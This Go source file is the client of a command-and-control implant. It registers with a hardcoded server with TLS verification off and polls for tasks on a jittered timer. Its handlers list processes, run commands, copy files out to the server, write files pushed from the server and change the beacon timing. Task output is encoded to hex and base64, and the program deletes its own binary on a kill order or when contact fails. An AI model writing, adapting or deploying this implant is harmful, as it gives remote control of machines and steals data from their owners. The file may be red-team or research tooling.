package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}

var customClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
	},
	Timeout: 10 * time.Second,
}

type ResultsCreate struct {
	TaskingID float64 `json:"tasking_id"`
	Session   string  `json:"session"`
	Task      string  `json:"task"`
	Args      string  `json:"args"`
	Results   string  `json:"results"`
}

func encodeToBaseHexString(input string) string {
	encodedBase64 := base64.StdEncoding.EncodeToString([]byte(input))
	encodedHex := hex.EncodeToString([]byte(encodedBase64))
	return encodedHex
}

func decodeFromHexBaseString(input string) (string, error) {
	decodedHex, err := hex.DecodeString(input)
	if err != nil {
		return "", err
	}
	decodedBase, err := base64.StdEncoding.DecodeString(string(decodedHex))
	if err != nil {
		return "", err
	}
	return string(decodedBase), nil
}

func encodeBytesToBaseHexString(input []byte) string {
	encodedBase64 := base64.StdEncoding.EncodeToString(input)
	encodedHex := hex.EncodeToString([]byte(encodedBase64))
	return encodedHex
}

func decodeUpload(input string) ([]byte, error) {
	decHex, err := hex.DecodeString(input)
	if err != nil {
		return nil, err
	}
	decBase, err := base64.StdEncoding.DecodeString(string(decHex))
	if err != nil {
		return nil, err
	}
	gzipData, err := gzip.NewReader(bytes.NewReader(decBase))
	if err != nil {
		return nil, err
	}
	defer gzipData.Close()
	var out bytes.Buffer
	if _, err := io.Copy(&out, gzipData); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

func FileTransferShipper(serverUrl string, taskData map[string]interface{}, results []byte) {
	encodedOutput := encodeBytesToBaseHexString(results)
	encodedArgs := encodeToBaseHexString(taskData["args"].(string))

	result := ResultsCreate{
		TaskingID: taskData["id"].(float64),
		Session:   taskData["session"].(string),
		Task:      taskData["task"].(string),
		Args:      encodedArgs,
		Results:   encodedOutput,
	}
	_, _ = PostJson(serverUrl, result)

}

func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
	encodedOutput := encodeToBaseHexString(results)
	encodedArgs := encodeToBaseHexString(taskData["args"].(string))

	result := ResultsCreate{
		TaskingID: taskData["id"].(float64),
		Session:   taskData["session"].(string),
		Task:      taskData["task"].(string),
		Args:      encodedArgs,
		Results:   encodedOutput,
	}
	_, _ = PostJson(serverUrl, result)

}

func PsHandler(serverUrl string, taskData map[string]interface{}) {
	processList, err := get_ps()
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, processList)
}

func ReconfigHandler(serverUrl string, taskData map[string]interface{}) {
	splitArgs := strings.Split(taskData["args"].(string), " ")
	callbackTimer.Callback_freq, _ = strconv.Atoi(splitArgs[0])
	callbackTimer.Jitter, _ = strconv.Atoi(splitArgs[1])
	callbackTimer.SelfTerminate, _ = strconv.Atoi(splitArgs[2])
	DataShipper(serverUrl, taskData, "true")
}

func DownloadHandler(serverUrl string, taskData map[string]interface{}) {
	inFile, err := os.Open(taskData["args"].(string))
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	defer inFile.Close()
	var buf bytes.Buffer

	gzipWriter := gzip.NewWriter(&buf)
	defer gzipWriter.Close()

	gzipWriter.Name = taskData["args"].(string)
	if _, err := io.Copy(gzipWriter, inFile); err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	if err := gzipWriter.Close(); err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	FileTransferShipper(serverUrl, taskData, buf.Bytes())

}

func UploadHandler(serverUrl string, taskData map[string]interface{}) {
	uploadArgsParts := strings.Split(taskData["args"].(string), ":")
	destFile, err := decodeFromHexBaseString(uploadArgsParts[0])
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
	}
	outputFile, err := decodeUpload(uploadArgsParts[1])
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	err = os.WriteFile(destFile, outputFile, os.FileMode(os.O_CREATE|os.O_WRONLY))
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, "true")

}

func ParseTasks(serverUrl string, tasking string) (string, error) {

	var tasks []map[string]interface{}
	err := json.Unmarshal([]byte(tasking), &tasks)
	if err != nil {
		return "", err
	}

	for _, taskData := range tasks {
		url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])

		if taskData["task"] == "ls" {
			LsHandler(url, taskData)
		} else if taskData["task"] == "ps" {
			PsHandler(url, taskData)
		} else if taskData["task"] == "exec_bg" {
			ExecBgHandler(url, taskData)
		} else if taskData["task"] == "exec_fg" {
			ExecFgHandler(url, taskData)
		} else if taskData["task"] == "reconfig" {
			ReconfigHandler(url, taskData)
		} else if taskData["task"] == "kill" {
			sendDeathMessage(serverUrl, taskData["session"].(string))
			DataShipper(url, taskData, "true")
			TerminateImplant()
		} else if taskData["task"] == "download" {
			DownloadHandler(url, taskData)
		} else if taskData["task"] == "upload" {
			UploadHandler(url, taskData)
		}

	}
	return "", nil
}

func TerminateImplant() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(3)
	}

	if _, err := os.Stat(exePath); err == nil {
		err := os.Remove(exePath)
		if err != nil {
			os.Exit(2)
		}
		os.Exit(1)
	}
	// Nothing on disk, just memory
	os.Exit(0)
}

func main() {

	retryCounter := 0
	serverUrl := "https://192.168.15.172:8000"

	initialInfo := GatherInfo()

	// register with server
	_, err := PostJson(serverUrl+"/implants/", initialInfo)
	if err != nil {
		panic(err)
	}

	// listen for sigterm and sigint (testing only)
	sigHandler(serverUrl, initialInfo.Session)

	for {
		nextInterval := RandomJitter(callbackTimer.Callback_freq, callbackTimer.Jitter)
		timer := time.NewTimer(nextInterval)

		<-timer.C
		resp, err := CheckIn(serverUrl, initialInfo.Session)
		if err != nil {
			retryCounter += 1
			if retryCounter >= callbackTimer.SelfTerminate {
				TerminateImplant()
			}
			continue
		}
		if resp != 200 && resp != 301 {
			retryCounter += 1
			if retryCounter >= callbackTimer.SelfTerminate {
				TerminateImplant()
			}
			continue
		}
		if resp == 301 {
			// we have tasking
			tasking, err := FetchTasking(serverUrl, initialInfo.Session)
			if err != nil {
			} else {
				ParseTasks(serverUrl, tasking)
			}
			continue
		}
		retryCounter = 0
		timer.Stop()
	}
}
